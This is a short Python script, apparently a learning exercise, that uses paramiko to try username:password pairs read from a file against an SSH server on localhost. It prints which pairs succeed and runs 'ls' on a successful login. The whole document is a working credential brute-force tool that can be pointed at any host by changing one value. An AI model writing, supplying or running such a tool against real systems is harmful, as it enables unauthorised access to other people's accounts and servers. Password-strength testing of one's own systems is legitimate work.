#!usr/bin/python

import paramiko
import sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

fd = open('upass.txt', "r")
for line in fd.readlines():
	user_pass = line.strip().split(':')
	try:
		ssh.connect(hostname='localhost', port='22', username=user_pass[0], password=user_pass[1])
	except:
		print('[-] username %s and password %s is incorrect!' %(user_pass[0],user_pass[1]))
	else:
		print('[-] username %s and password %s is correct!' %(user_pass[0],user_pass[1]))

		stdin, stdout, stderr = ssh.exec_command('ls')
		for line in stdout.readlines():
			print(line.strip())

ssh.close()
